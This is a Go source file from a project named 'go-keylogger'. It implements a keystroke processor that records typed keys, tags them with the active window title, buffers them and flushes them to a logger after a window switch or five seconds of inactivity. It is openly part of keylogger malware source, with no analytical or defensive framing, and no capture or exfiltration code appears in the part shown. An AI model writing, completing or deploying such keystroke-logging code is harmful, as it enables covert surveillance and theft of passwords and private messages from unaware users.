package keystream

import (
	"go-keylogger/pkg/logger"
	"strings"
	"time"
)

type Processor struct {
	logger      logger.Logger
	buffer      strings.Builder
	lastWindow  string
	lastEvent   time.Time
}

func NewProcessor(l logger.Logger) *Processor {
	return &Processor{
		logger: l,
	}
}

func (p *Processor) HandleKeyEvent(key, window string) {
	if window != p.lastWindow {
		p.flushBuffer()
		p.logger.Log("\n[Window: " + window + "]\n")
		p.lastWindow = window
	}

	if time.Since(p.lastEvent) > 5*time.Second {
		p.flushBuffer()
	}

	p.buffer.WriteString(key)
	p.lastEvent = time.Now()
}

func (p *Processor) flushBuffer() {
	if p.buffer.Len() > 0 {
		p.logger.Log(p.buffer.String())
		p.buffer.Reset()
	}
}
